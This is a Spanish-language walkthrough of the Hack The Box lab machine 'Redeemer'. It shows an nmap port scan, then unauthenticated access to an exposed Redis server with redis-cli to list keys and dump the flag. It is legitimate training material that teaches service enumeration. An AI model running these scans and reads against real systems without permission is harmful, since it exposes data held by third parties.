# Máquina Redeemer

#### OS: Linux
#### Tier: Starting Point
#### Release date: 11/5/2022
#### IP de ejemplo: 10.129.118.173

## Reconocimiento
comenzamos realizando un escaneo de puertos por tcp con `nmap`:
```
sudo nmap -sS -p- --open --min-rate 5000 -vvv -Pn -n 10.129.118.173
```
```
PORT     STATE SERVICE REASON
6379/tcp open  redis   syn-ack ttl 63
```
vemos un único puerto: 6379/redis. Redis es un tipo de base de datos clave-valor utilizada comúnmente como caché, broker de mensajes y almacén de sesiones. Podemos ver más sobre enumeración y pentesting a redis en este post de `Hacktricks`:
```
https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html
```
sigámoslo para aprender a enumerar este sevricio. Usaremos `redis-cli`
```
sudo apt-get install redis-tools -y
```
```
❯ redis-cli -h 10.129.118.173
10.129.118.173:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
<SNIP>
```
parece que hemos entrado sin autenticación. Siguiendo lo que dice HackTricks, vamos a listar las bases de datos 
```
10.129.118.173:6379> INFO keyspace

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```
4 keys en db0, vamos a ver sus nombres:
```
10.129.118.173:6379> keys *

1) "numb"
2) "temp"
3) "flag"
4) "stor"
```

claramente la key flag es la que nos interesa. leámosla con `TYPE <KEY>`
```
10.129.118.173:6379> TYPE flag
string
```
esa no es la flag, sino el tipo de contenido. en Hacktricks podemos leer: 

`# If the type used is weird you can always do:
DUMP <key>`

hagamos eso: 
```
10.129.118.173:6379> DUMP flag

"\x00 <REDACTED>\t\x00\xeff$7\xf4.\xdeE"
```
la flag viene entre bytes codificados en hexadecimal o caracteres ASCII, pero podemos reconocerla fácilmente puesto que es un valor hash md5, el formato que se usa en HTB.
